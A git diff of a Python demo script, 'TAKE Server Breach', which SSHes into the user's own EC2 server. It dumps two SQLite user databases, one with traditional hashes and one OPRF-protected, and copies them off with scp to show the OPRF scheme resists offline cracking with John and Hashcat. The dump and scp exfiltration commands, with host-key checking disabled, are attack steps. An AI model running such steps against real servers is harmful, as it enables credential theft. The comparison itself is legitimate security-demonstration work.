@@ -2,6 +2,8 @@
 """
 TAKE Server Breach — REAL Attack
 SSHs into AWS, steals BOTH databases, cracks them with John + Hashcat.
+Make sure to edit the SERVER and SSH_KEY variables to point to your EC2 instance before running.
+Also ensure you have nmap, john, hashcat, and seclists (or any other wordlist) installed on your local machine.
 """
 
 import sys, os, time, sqlite3, subprocess, hashlib, shutil, tempfile
@@ -17,8 +19,8 @@ RESET  = "\033[0m"
 BG_RED = "\033[41m"
 BG_GREEN = "\033[42m"
 
-SERVER   = os.environ.get("TAKE_SERVER_IP", "98.92.215.131")  # Replace with your EC2 IP
-SSH_KEY  = os.environ.get("TAKE_SSH_KEY", "./infra/my-key.pem")  # Path to your private key
+SERVER   = os.environ.get("TAKE_SERVER_IP", "18.208.203.94")  # Replace with your EC2 IP
+SSH_KEY  = os.environ.get("TAKE_SSH_KEY", "../infra/my-key.pem")  # Path to your private key
 SSH_USER = "ec2-user"
 TMPDIR   = tempfile.mkdtemp(prefix="take_breach_")
 
@@ -85,7 +87,7 @@ def main():
     print()
 
     print(f"  {WHITE}Hunting for databases and secrets...{RESET}\n")
-    ssh("find /home/ec2-user/take-project -type f | sort")
+    ssh("find /home/ec2-user/take-oprf-protocol -type f | sort")
     print()
 
     print(f"  {WHITE}Trying to read the master key...{RESET}\n")
@@ -95,16 +97,16 @@ def main():
 
     # Dump traditional DB on the server
     print(f"  {RED}{BOLD}── Dumping TRADITIONAL database (what normal apps use) ──{RESET}\n")
-    ssh("sqlite3 /home/ec2-user/take-project/traditional_users.db '.schema users'")
+    ssh("sqlite3 /home/ec2-user/take-oprf-protocol/traditional_users.db '.schema users'")
     print()
-    ssh("sqlite3 /home/ec2-user/take-project/traditional_users.db 'SELECT * FROM users'")
+    ssh("sqlite3 /home/ec2-user/take-oprf-protocol/traditional_users.db 'SELECT * FROM users'")
     print()
 
     # Dump TAKE DB on the server
     print(f"  {RED}{BOLD}── Dumping TAKE database (OPRF-protected) ──{RESET}\n")
-    ssh("sqlite3 /home/ec2-user/take-project/take_server.db '.schema users'")
+    ssh("sqlite3 /home/ec2-user/take-oprf-protocol/take_server.db '.schema users'")
     print()
-    ssh("sqlite3 /home/ec2-user/take-project/take_server.db 'SELECT id_u, substr(credential,1,60) FROM users'")
+    ssh("sqlite3 /home/ec2-user/take-oprf-protocol/take_server.db 'SELECT id_u, substr(credential,1,60) FROM users'")
     print()
 
     # Exfiltrate both
@@ -112,8 +114,8 @@ def main():
     stolen_trad = os.path.join(TMPDIR, "traditional_users.db")
     stolen_take = os.path.join(TMPDIR, "take_server.db")
 
-    run(f"scp -i {SSH_KEY} -o StrictHostKeyChecking=no {SSH_USER}@{SERVER}:/home/ec2-user/take-project/traditional_users.db {stolen_trad}", timeout=30)
-    run(f"scp -i {SSH_KEY} -o StrictHostKeyChecking=no {SSH_USER}@{SERVER}:/home/ec2-user/take-project/take_server.db {stolen_take}", timeout=30)
+    run(f"scp -i {SSH_KEY} -o StrictHostKeyChecking=no {SSH_USER}@{SERVER}:/home/ec2-user/take-oprf-protocol/traditional_users.db {stolen_trad}", timeout=30)
+    run(f"scp -i {SSH_KEY} -o StrictHostKeyChecking=no {SSH_USER}@{SERVER}:/home/ec2-user/take-oprf-protocol/take_server.db {stolen_take}", timeout=30)
     print()
 
     for label, path in [("TRADITIONAL", stolen_trad), ("TAKE", stolen_take)]:
